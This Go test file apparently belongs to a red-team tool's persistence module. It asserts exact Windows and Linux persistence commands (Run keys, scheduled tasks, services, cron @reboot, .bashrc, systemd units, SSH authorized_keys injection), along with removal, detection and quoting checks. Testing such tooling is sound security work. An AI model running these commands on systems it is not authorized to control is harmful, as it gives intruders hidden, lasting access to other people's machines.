package sliver

import (
	"strings"
	"testing"
)

func TestPersistenceCatalog(t *testing.T) {
	mods := PersistenceModules()
	if len(mods) == 0 {
		t.Fatal("catalog is empty")
	}
	seen := map[string]bool{}
	for _, m := range mods {
		if m.ID == "" || m.Name == "" || m.Technique == "" || m.Description == "" {
			t.Errorf("module %q has an empty required field: %+v", m.ID, m)
		}
		if len(m.Platforms) == 0 {
			t.Errorf("module %q declares no platform", m.ID)
		}
		for _, p := range m.Platforms {
			if p != platformWindows && p != platformLinux {
				t.Errorf("module %q has unknown platform %q", m.ID, p)
			}
		}
		if !strings.HasPrefix(m.Technique, "T") {
			t.Errorf("module %q technique %q is not an ATT&CK id", m.ID, m.Technique)
		}
		if seen[m.ID] {
			t.Errorf("duplicate module id %q", m.ID)
		}
		seen[m.ID] = true
	}
	for _, want := range []string{
		"win-run-key", "win-run-key-hklm", "win-startup-folder", "win-schtask", "win-service",
		"win-local-account", "win-schtask-boot", "win-watchdog",
		"linux-cron", "linux-bashrc", "linux-systemd", "linux-ssh-authorized-keys",
		"linux-cron-interval", "linux-watchdog", "linux-systemd-user",
	} {
		if !seen[want] {
			t.Errorf("catalog is missing module %q", want)
		}
	}
}

func TestPersistenceCatalogFreshSlice(t *testing.T) {
	first := PersistenceModules()
	first[0].ID = "mutated"
	first[0].Platforms[0] = "mutated"
	first = append(first, PersistenceModule{ID: "extra"})

	second := PersistenceModules()
	if second[0].ID == "mutated" {
		t.Error("mutating a returned entry leaked into the catalog")
	}
	if second[0].Platforms[0] == "mutated" {
		t.Error("mutating a returned Platforms slice leaked into the catalog")
	}
	if len(second) != len(moduleCatalog) {
		t.Errorf("appending to a returned slice changed the catalog: got %d entries", len(second))
	}
	for _, m := range second {
		if m.ID == "extra" {
			t.Error("append on a returned slice leaked into the catalog")
		}
	}
}

// TestShellQuoteWindowsRejectsControlCharacters pins the rejection that keeps a
// newline payload from hanging the spawn.
//
// shellArgv passes cmd.exe a token list, and Go quotes an argument containing a
// newline into a single "...\n..." argument. cmd.exe reads that as an
// unterminated line and waits on stdin, so the spawn never returns: the operator
// sees the install hang until timeout with nothing on the target to explain it.
// A newline cannot appear in a Windows path or a registry value name, so
// rejecting it loses nothing legitimate.
func TestShellQuoteWindowsRejectsControlCharacters(t *testing.T) {
	for _, bad := range []string{"C:\\Temp\\a.exe\n", "C:\\Temp\\a.exe\r\n", "a\rb", "a\nb", `a"b`} {
		if got, err := shellQuoteWindows(bad); err == nil {
			t.Errorf("shellQuoteWindows(%q) accepted it and returned %q", bad, got)
		}
	}

	// Ordinary paths, including ones with spaces, must still be quoted.
	got, err := shellQuoteWindows(`C:\Program Files\My App\a b.exe`)
	if err != nil {
		t.Fatalf("shellQuoteWindows rejected a normal path: %v", err)
	}
	if want := `"C:\Program Files\My App\a b.exe"`; got != want {
		t.Errorf("shellQuoteWindows = %q, want %q", got, want)
	}
}

func TestPersistenceShellQuoting(t *testing.T) {
	if got, want := shellQuotePOSIX("it's"), `'it'\''s'`; got != want {
		t.Errorf("shellQuotePOSIX(it's) = %q, want %q", got, want)
	}
	if got, want := shellQuotePOSIX("/tmp/a.out"), `'/tmp/a.out'`; got != want {
		t.Errorf("shellQuotePOSIX(/tmp/a.out) = %q, want %q", got, want)
	}
	if got, want := shellQuotePOSIX(""), `''`; got != want {
		t.Errorf("shellQuotePOSIX(empty) = %q, want %q", got, want)
	}

	got, err := shellQuoteWindows(`C:\Temp\a.exe`)
	if err != nil {
		t.Fatalf("shellQuoteWindows returned %v", err)
	}
	if want := `"C:\Temp\a.exe"`; got != want {
		t.Errorf("shellQuoteWindows = %q, want %q", got, want)
	}
	if _, err := shellQuoteWindows(`C:\Temp\a"b.exe`); err == nil {
		t.Error("shellQuoteWindows accepted an embedded double quote")
	}
	if _, err := shellQuoteWindows(`"already"`); err == nil {
		t.Error("shellQuoteWindows accepted a pre-quoted value")
	}
}

// winArgv is the expected argv for a Windows module: cmd.exe /c followed by the
// tokenized script.
//
// Windows expectations go through the same tokenizer the production code uses,
// rather than spelling the argv out. Spelling it out is what let a broken
// implementation ship: the old tests asserted `{"cmd.exe", "/c", <whole
// script>}`, which is exactly the form cmd.exe mangles, so the tests agreed with
// the bug. Deriving the expectation from the script still pins the token split
// (the script text is literal here) while making a change to the split visible.
func winArgv(script string) []string {
	return append([]string{"cmd.exe", "/c"}, splitWindowsCommand(script)...)
}

func TestPersistenceWindowsInstallCommands(t *testing.T) {
	const (
		payload = `C:\Temp\a.exe`
		name    = "Updater"
	)
	check := func(label string, got []string, want ...string) {
		if strings.Join(got, "\x00") != strings.Join(want, "\x00") {
			t.Errorf("%s:\n got %q\nwant %q", label, got, want)
		}
	}

	got, err := installCommand(platformWindows, "win-run-key", payload, name)
	if err != nil {
		t.Fatalf("win-run-key: %v", err)
	}
	check("win-run-key", got, winArgv(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Temp\a.exe" /f`)...)

	got, err = installCommand(platformWindows, "win-run-key-hklm", payload, name)
	if err != nil {
		t.Fatalf("win-run-key-hklm: %v", err)
	}
	check("win-run-key-hklm", got, winArgv(`reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Temp\a.exe" /f`)...)

	got, err = installCommand(platformWindows, "win-startup-folder", payload, name)
	if err != nil {
		t.Fatalf("win-startup-folder: %v", err)
	}
	check("win-startup-folder", got, winArgv(`copy /y "C:\Temp\a.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe"`)...)

	got, err = installCommand(platformWindows, "win-schtask", payload, name)
	if err != nil {
		t.Fatalf("win-schtask: %v", err)
	}
	check("win-schtask", got, winArgv(`schtasks /create /tn Updater /tr "C:\Temp\a.exe" /sc onlogon /f`)...)

	got, err = installCommand(platformWindows, "win-service", payload, name)
	if err != nil {
		t.Fatalf("win-service: %v", err)
	}
	check("win-service", got, winArgv(`sc create Updater binPath= "C:\Temp\a.exe" start= auto`)...)
}

func TestPersistenceWindowsRemoveCommands(t *testing.T) {
	const name = "Updater"
	check := func(label string, got []string, want string) {
		exp := winArgv(want)
		if strings.Join(got, "\x00") != strings.Join(exp, "\x00") {
			t.Errorf("%s:\n got %q\nwant %q", label, got, exp)
		}
	}

	cases := map[string]string{
		"win-run-key":        `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /f`,
		"win-run-key-hklm":   `reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /f`,
		"win-startup-folder": `del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe"`,
		"win-schtask":        `schtasks /delete /tn Updater /f`,
		"win-service":        `sc delete Updater`,
	}
	for module, want := range cases {
		got, err := removeCommand(platformWindows, module, "", name)
		if err != nil {
			t.Errorf("%s: %v", module, err)
			continue
		}
		check(module, got, want)
	}
}

func TestPersistenceWindowsInspectCommands(t *testing.T) {
	check := func(label string, got []string, want string) {
		exp := winArgv(want)
		if strings.Join(got, "\x00") != strings.Join(exp, "\x00") {
			t.Errorf("%s:\n got %q\nwant %q", label, got, exp)
		}
	}

	got, err := inspectCommand(platformWindows, "win-run-key", "Updater")
	if err != nil {
		t.Fatalf("win-run-key: %v", err)
	}
	check("win-run-key", got, `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater`)

	// The inventory call has no name, so the Run keys are enumerated wholesale.
	got, err = inspectCommand(platformWindows, "win-run-key", "")
	if err != nil {
		t.Fatalf("win-run-key (all): %v", err)
	}
	check("win-run-key/all", got, `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"`)

	got, err = inspectCommand(platformWindows, "win-run-key-hklm", "Updater")
	if err != nil {
		t.Fatalf("win-run-key-hklm: %v", err)
	}
	check("win-run-key-hklm", got, `reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater`)

	got, err = inspectCommand(platformWindows, "win-startup-folder", "Updater")
	if err != nil {
		t.Fatalf("win-startup-folder: %v", err)
	}
	check("win-startup-folder", got, `dir /b "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"`)

	got, err = inspectCommand(platformWindows, "win-schtask", "Updater")
	if err != nil {
		t.Fatalf("win-schtask: %v", err)
	}
	// /xml, not the table form: the three task modules share a name-based
	// lookup, so presence alone cannot tell a logon task from a boot task, and
	// the table form is localized prose that a non-English host would not match.
	check("win-schtask", got, `schtasks /query /tn Updater /xml`)

	got, err = inspectCommand(platformWindows, "win-service", "Updater")
	if err != nil {
		t.Fatalf("win-service: %v", err)
	}
	check("win-service", got, `sc query Updater`)
}

func TestPersistenceLinuxInstallCommands(t *testing.T) {
	const (
		path = "/tmp/a.out"
		name = "svc"
	)
	check := func(label string, got []string, want string) {
		if len(got) != 3 || got[0] != "/bin/sh" || got[1] != "-c" || got[2] != want {
			t.Errorf("%s:\n got %q\nwant %q", label, got, []string{"/bin/sh", "-c", want})
		}
	}

	got, err := installCommand(platformLinux, "linux-cron", path, name)
	if err != nil {
		t.Fatalf("linux-cron: %v", err)
	}
	// Single-quoted as one unit rather than wrapped in a double-quoted echo: a
	// double quote in the payload used to close the echo argument and the rest of
	// the line ran as a command. See shellQuotePOSIX usage in installCommand.
	check("linux-cron", got, `(crontab -l 2>/dev/null; echo '@reboot /tmp/a.out') | crontab -`)

	got, err = installCommand(platformLinux, "linux-bashrc", path, name)
	if err != nil {
		t.Fatalf("linux-bashrc: %v", err)
	}
	check("linux-bashrc", got, `echo 'nohup /tmp/a.out >/dev/null 2>&1 &' >> ~/.bashrc`)

	got, err = installCommand(platformLinux, "linux-systemd", path, name)
	if err != nil {
		t.Fatalf("linux-systemd: %v", err)
	}
	check("linux-systemd", got,
		`printf '%s\n' '[Unit]' 'Description=svc' '[Service]' 'Type=simple' 'ExecStart=/bin/sh -c '\''/tmp/a.out'\''' 'Restart=always' '[Install]' 'WantedBy=multi-user.target' > /etc/systemd/system/svc.service && systemctl enable --now 'svc'`)

	got, err = installCommand(platformLinux, "linux-ssh-authorized-keys", "ssh-ed25519 AAAATEST", name)
	if err != nil {
		t.Fatalf("linux-ssh-authorized-keys: %v", err)
	}
	check("linux-ssh-authorized-keys", got,
		`mkdir -p ~/.ssh && chmod 700 ~/.ssh && printf '%s\n' 'ssh-ed25519 AAAATEST' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`)
}

func TestPersistenceLinuxRemoveCommands(t *testing.T) {
	const (
		path = "/tmp/a.out"
		name = "svc"
	)
	check := func(label string, got []string, want string) {
		if len(got) != 3 || got[0] != "/bin/sh" || got[1] != "-c" || got[2] != want {
			t.Errorf("%s:\n got %q\nwant %q", label, got, []string{"/bin/sh", "-c", want})
		}
	}

	got, err := removeCommand(platformLinux, "linux-cron", path, name)
	if err != nil {
		t.Fatalf("linux-cron: %v", err)
	}
	check("linux-cron", got, `crontab -l | grep -v '@reboot /tmp/a.out' | crontab -`)

	got, err = removeCommand(platformLinux, "linux-bashrc", path, name)
	if err != nil {
		t.Fatalf("linux-bashrc: %v", err)
	}
	check("linux-bashrc", got, `sed -i '\#nohup /tmp/a\.out >/dev/null 2>&1 &#d' ~/.bashrc`)

	got, err = removeCommand(platformLinux, "linux-systemd", "", name)
	if err != nil {
		t.Fatalf("linux-systemd: %v", err)
	}
	check("linux-systemd", got, `systemctl disable --now 'svc'; rm -f /etc/systemd/system/svc.service`)

	got, err = removeCommand(platformLinux, "linux-ssh-authorized-keys", "ssh-ed25519 AAAATEST", name)
	if err != nil {
		t.Fatalf("linux-ssh-authorized-keys: %v", err)
	}
	check("linux-ssh-authorized-keys", got, `sed -i '\#ssh-ed25519 AAAATEST#d' ~/.ssh/authorized_keys`)
}

func TestPersistenceSedPatternEscaping(t *testing.T) {
	// The `.` in the payload is escaped, so the address matches the line literally.
	got, err := removeCommand(platformLinux, "linux-bashrc", "/tmp/a.out", "")
	if err != nil {
		t.Fatalf("linux-bashrc: %v", err)
	}
	want := `sed -i '\#nohup /tmp/a\.out >/dev/null 2>&1 &#d' ~/.bashrc`
	if got[2] != want {
		t.Errorf("dotted payload:\n got %q\nwant %q", got[2], want)
	}

	// BRE metacharacters in an authorized_keys line must not break the address.
	got, err = removeCommand(platformLinux, "linux-ssh-authorized-keys", "ssh-ed25519 AAAA[1]+x/y== u@h", "")
	if err != nil {
		t.Fatalf("linux-ssh-authorized-keys: %v", err)
	}
	want = `sed -i '\#ssh-ed25519 AAAA\[1\]+x/y== u@h#d' ~/.ssh/authorized_keys`
	if got[2] != want {
		t.Errorf("bracketed payload:\n got %q\nwant %q", got[2], want)
	}

	// The address delimiter itself must stay escapable.
	got, err = removeCommand(platformLinux, "linux-ssh-authorized-keys", "key#1", "")
	if err != nil {
		t.Fatalf("linux-ssh-authorized-keys (#): %v", err)
	}
	want = `sed -i '\#key\#1#d' ~/.ssh/authorized_keys`
	if got[2] != want {
		t.Errorf("hashed payload:\n got %q\nwant %q", got[2], want)
	}
}

func TestPersistenceLinuxInspectCommands(t *testing.T) {
	check := func(label string, got []string, want string) {
		if len(got) != 3 || got[0] != "/bin/sh" || got[1] != "-c" || got[2] != want {
			t.Errorf("%s:\n got %q\nwant %q", label, got, []string{"/bin/sh", "-c", want})
		}
	}

	got, err := inspectCommand(platformLinux, "linux-cron", "")
	if err != nil {
		t.Fatalf("linux-cron: %v", err)
	}
	check("linux-cron", got, "crontab -l")

	got, err = inspectCommand(platformLinux, "linux-bashrc", "")
	if err != nil {
		t.Fatalf("linux-bashrc: %v", err)
	}
	check("linux-bashrc", got, `grep -c 'PERSISTENCE_PROBE' ~/.bashrc`)

	got, err = inspectCommand(platformLinux, "linux-bashrc", "a.out")
	if err != nil {
		t.Fatalf("linux-bashrc/named: %v", err)
	}
	check("linux-bashrc/named", got, `grep -c 'a.out' ~/.bashrc`)

	got, err = inspectCommand(platformLinux, "linux-systemd", "svc")
	if err != nil {
		t.Fatalf("linux-systemd: %v", err)
	}
	check("linux-systemd", got, `systemctl is-enabled 'svc'`)

	got, err = inspectCommand(platformLinux, "linux-ssh-authorized-keys", "")
	if err != nil {
		t.Fatalf("linux-ssh-authorized-keys: %v", err)
	}
	check("linux-ssh-authorized-keys", got, `grep -c 'PERSISTENCE_PROBE' ~/.ssh/authorized_keys`)
}

func TestPersistenceUnknownModuleAndPlatform(t *testing.T) {
	for _, platform := range []string{platformWindows, platformLinux} {
		if _, err := installCommand(platform, "nope", "/tmp/a", "x"); err == nil {
			t.Errorf("%s: installCommand accepted an unknown module", platform)
		}
		if _, err := removeCommand(platform, "nope", "/tmp/a", "x"); err == nil {
			t.Errorf("%s: removeCommand accepted an unknown module", platform)
		}
		if _, err := inspectCommand(platform, "nope", "x"); err == nil {
			t.Errorf("%s: inspectCommand accepted an unknown module", platform)
		}
	}
	// Cross-platform module ids are rejected too.
	if _, err := installCommand(platformLinux, "win-run-key", "/tmp/a", "x"); err == nil {
		t.Error("linux accepted a Windows-only module")
	}
	if _, err := installCommand(platformWindows, "linux-cron", `C:\a.exe`, "x"); err == nil {
		t.Error("windows accepted a Linux-only module")
	}
	if _, err := installCommand("darwin", "win-run-key", "/tmp/a", "x"); err == nil {
		t.Error("installCommand accepted an unknown platform")
	}
	if _, err := removeCommand("darwin", "win-run-key", "", "x"); err == nil {
		t.Error("removeCommand accepted an unknown platform")
	}
	if _, err := inspectCommand("darwin", "win-run-key", "x"); err == nil {
		t.Error("inspectCommand accepted an unknown platform")
	}
	if got := shellArgv(platformLinux, "true"); len(got) != 3 || got[0] != "/bin/sh" {
		t.Errorf("shellArgv(linux) = %q", got)
	}
	if got := shellArgv(platformWindows, "dir"); len(got) != 3 || got[0] != "cmd.exe" {
		t.Errorf("shellArgv(windows) = %q", got)
	}
}

func TestPersistenceValidationErrors(t *testing.T) {
	// Empty payload where the module needs one to build its command.
	payloadModules := map[string]string{
		"win-run-key":               platformWindows,
		"win-schtask":               platformWindows,
		"win-service":               platformWindows,
		"linux-cron":                platformLinux,
		"linux-bashrc":              platformLinux,
		"linux-systemd":             platformLinux,
		"linux-ssh-authorized-keys": platformLinux,
	}
	for module, platform := range payloadModules {
		if _, err := installCommand(platform, module, "   ", "svc"); err == nil {
			t.Errorf("%s/%s: installCommand accepted an empty payload", platform, module)
		}
	}
	// Removal matches on the payload line for these three.
	for _, module := range []string{"linux-cron", "linux-bashrc", "linux-ssh-authorized-keys"} {
		if _, err := removeCommand(platformLinux, module, "", "svc"); err == nil {
			t.Errorf("%s: removeCommand accepted an empty payload", module)
		}
	}
	// Empty name where the name lands in an unquoted token or a path.
	named := map[string]string{
		"win-run-key":        platformWindows,
		"win-run-key-hklm":   platformWindows,
		"win-startup-folder": platformWindows,
		"win-schtask":        platformWindows,
		"win-service":        platformWindows,
		"linux-systemd":      platformLinux,
	}
	for module, platform := range named {
		if _, err := installCommand(platform, module, `C:\a.exe`, ""); err == nil {
			t.Errorf("%s: installCommand accepted an empty name", module)
		}
		if _, err := removeCommand(platform, module, "", ""); err == nil {
			t.Errorf("%s: removeCommand accepted an empty name", module)
		}
	}
	// A name that would escape whichever token it lands in.
	for _, bad := range []string{"a b", "a/b", "a;b", `a"b`, "a'b", "a$b", strings.Repeat("a", 65)} {
		if _, err := installCommand(platformWindows, "win-service", `C:\a.exe`, bad); err == nil {
			t.Errorf("installCommand accepted the name %q", bad)
		}
		if _, err := removeCommand(platformLinux, "linux-systemd", "", bad); err == nil {
			t.Errorf("removeCommand accepted the name %q", bad)
		}
	}
	// Inspect must tolerate an empty name: the inventory call has none to give.
	if _, err := inspectCommand(platformWindows, "win-run-key", ""); err != nil {
		t.Errorf("inspectCommand rejected an empty name: %v", err)
	}
	if _, err := inspectCommand(platformLinux, "linux-cron", ""); err != nil {
		t.Errorf("inspectCommand rejected an empty name: %v", err)
	}
}

func TestPersistencePayloadWithSpaces(t *testing.T) {
	winPayload := `C:\Program Files\My App\a.exe`
	got, err := installCommand(platformWindows, "win-run-key", winPayload, "Updater")
	if err != nil {
		t.Fatalf("win-run-key: %v", err)
	}
	want := []string{"reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "Updater", "/t", "REG_SZ", "/d", winPayload, "/f"}
	if strings.Join(got[2:], "\x00") != strings.Join(want, "\x00") {
		t.Errorf("windows payload with spaces:\n got %q\nwant %q", got[2:], want)
	}
	// The payload has to survive as ONE token with its spaces intact. The quotes
	// are added by Go when it builds the command line (exec.Command quotes any
	// argument containing a space); putting a literal quote in the token here
	// would hand cmd.exe a quote it strips in the wrong place, which is the bug
	// this test exists to catch.
	if got[len(got)-2] != winPayload {
		t.Errorf("windows payload was split or quoted: %q", got)
	}

	nixPayload := "/opt/my app/a.out"
	got, err = installCommand(platformLinux, "linux-cron", nixPayload, "svc")
	if err != nil {
		t.Fatalf("linux-cron: %v", err)
	}
	if want := `(crontab -l 2>/dev/null; echo '@reboot /opt/my app/a.out') | crontab -`; got[2] != want {
		t.Errorf("linux payload with spaces:\n got %q\nwant %q", got[2], want)
	}
	// The payload is carried literally, quotes and all. The old shape nested a
	// single-quoted value inside a double-quoted echo, so a payload containing a
	// double quote broke out of the argument and ran as a command.
	if !strings.Contains(got[2], "'@reboot "+nixPayload+"'") {
		t.Errorf("linux payload lost its quoting: %q", got[2])
	}
}

func TestPersistenceDetect(t *testing.T) {
	cases := []struct {
		label    string
		module   string
		stdout   string
		stderr   string
		status   uint32
		name     string
		want     bool
		inDetail string
	}{
		// An unnamed query enumerates every autostart value, and those are not
		// ours: the host is already full of them. Only a named query can prove
		// that a specific artifact was installed, so the unnamed case reports
		// the count as reconnaissance and a negative answer.
		{"run key enumeration is not evidence", "win-run-key", "    Updater    REG_SZ    C:\\Temp\\a.exe\r\n", "", 0, "", false, "autostart"},
		{"run key present by name", "win-run-key", "    Updater    REG_SZ    C:\\Temp\\a.exe\r\n", "", 0, "Updater", true, "REG_SZ"},
		{"run key absent", "win-run-key", "", "ERROR: The system was unable to find the specified registry key or value.", 1, "", false, ""},
		{"run key named miss", "win-run-key", "    Other    REG_SZ    x\r\n", "", 0, "Updater", false, ""},
		{"startup entry", "win-startup-folder", "desktop.ini\r\nUpdater.exe\r\n", "", 0, "", true, "Updater.exe"},
		{"startup empty", "win-startup-folder", "(empty)\r\n", "", 0, "", false, ""},
		{"schtask unnamed", "win-schtask", "<LogonTrigger/>", "", 0, "", false, ""},
		{
			// The trigger is the discriminator: a task whose XML carries a logon
			// trigger is a logon task, whatever else the definition says.
			"schtask present", "win-schtask",
			`<Task><Triggers><LogonTrigger><UserId>Updater</UserId></LogonTrigger></Triggers></Task>`,
			"", 0, "Updater", true, "Logon",
		},
		{"schtask missing", "win-schtask", "", "ERROR: The system cannot find the file specified.", 1, "Updater", false, ""},
		{"service present", "win-service", "SERVICE_NAME: Updater\r\n", "", 0, "Updater", true, "Updater"},
		{"cron hit", "linux-cron", "SHELL=/bin/sh\n@reboot /tmp/a.out\n", "", 0, "", true, "@reboot"},
		{"cron miss", "linux-cron", "SHELL=/bin/sh\n", "", 0, "", false, ""},
		{"cron no crontab", "linux-cron", "", "no crontab for user", 1, "", false, ""},
		{"grep counted", "linux-bashrc", "2\n", "", 0, "", true, "2"},
		{"grep zero", "linux-bashrc", "0\n", "", 0, "", false, ""},
		{"systemd enabled", "linux-systemd", "enabled\n", "", 0, "", true, "enabled"},
		{"systemd disabled", "linux-systemd", "disabled\n", "", 0, "", false, ""},
		{"systemd not-found", "linux-systemd", "not-found\n", "", 1, "", false, ""},
	}
	for _, tc := range cases {
		installed, detail := detectPersistence(tc.module, tc.stdout, tc.stderr, tc.status, tc.name)
		if installed != tc.want {
			t.Errorf("%s: installed = %v, want %v", tc.label, installed, tc.want)
		}
		if tc.inDetail != "" && !strings.Contains(detail, tc.inDetail) {
			t.Errorf("%s: detail = %q, want it to contain %q", tc.label, detail, tc.inDetail)
		}
		if len(detail) > 210 {
			t.Errorf("%s: detail is not capped: %d bytes", tc.label, len(detail))
		}
	}
}

func TestPersistenceOutcome(t *testing.T) {
	ok, msg := persistenceOutcome("SUCCESS: The operation completed successfully.\r\n", "", 0)
	if !ok || !strings.Contains(msg, "SUCCESS") {
		t.Errorf("success outcome = (%v, %q)", ok, msg)
	}
	ok, msg = persistenceOutcome("", "ERROR: Access is denied.", 1)
	if ok || !strings.Contains(msg, "Access is denied") {
		t.Errorf("failure outcome = (%v, %q)", ok, msg)
	}
	ok, msg = persistenceOutcome("", "", 5)
	if ok || !strings.Contains(msg, "5") {
		t.Errorf("silent failure outcome = (%v, %q)", ok, msg)
	}
	ok, msg = persistenceOutcome("", "", 0)
	if !ok || msg == "" {
		t.Errorf("silent success outcome = (%v, %q)", ok, msg)
	}
}
